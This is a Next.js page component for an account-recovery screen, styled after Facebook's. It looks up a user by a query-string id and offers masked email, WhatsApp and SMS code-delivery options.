import React from "react";
import AccountInfo from "./AccountInfo";
import { notFound } from "next/navigation";
import { store } from "@/redux/store";
import { userApi } from "@/redux/features/user/userApi";
import { IUser } from "@/types";

export interface IMatchedUser {
  methods: {
    type: string;
    label: string;
    description?: string;
    disabled?: boolean;
  }[];
  user: IUser;
}

function hideString(str: string) {
  if (str.length <= 6) {
    // If string is too short, return it as is
    return str;
  }

  const first = str.slice(0, 3); // first 3 chars
  const last = str.slice(-3); // last 3 chars
  const middle = "*".repeat(str.length - 6); // stars for the middle part

  return first + middle + last;
}

const page = async ({
  searchParams,
}: {
  searchParams: Promise<{ id?: string; email?: string }>;
}) => {
  const { id, email } = await searchParams;
  if (!id || !email) return notFound();
  const res = await store.dispatch(userApi.endpoints.getUserById.initiate(id));

  const user: IMatchedUser = {
    methods: [
      {
        type: "facebook-code",
        label: "Send code via Facebook notification",
        description:
          "You're logged in on another app or device. Get a notification with a login code.",
        disabled: true,
      },
    ],
    user: {} as IUser,
  };

  if (res.data?.data) {
    user.user = res.data?.data;
  }
  if (res.data?.data?.email) {
    user.methods.push({
      label: "Send code via email",
      type: "email-code",
      description: hideString(res.data?.data?.email),
      disabled: false,
    });
  }
  if (res.data?.data?.phone) {
    user.methods.push({
      label: "Send code via whatsapp",
      type: "phone-code",
      description: hideString(res.data?.data?.phone || ("" as string)),
      disabled: true,
    });
    user.methods.push({
      label: "Send code via SMS",
      type: "sms-code",
      description: hideString(res.data?.data?.phone || ("" as string)),
      disabled: true,
    });
  }
  return (
    <div className="min-h-screen bg-[rgb(232,234,237)] flex flex-col justify-center items-center py-12 sm:px-6 lg:px-8">
      <AccountInfo user={user} />
    </div>
  );
};

export default page;
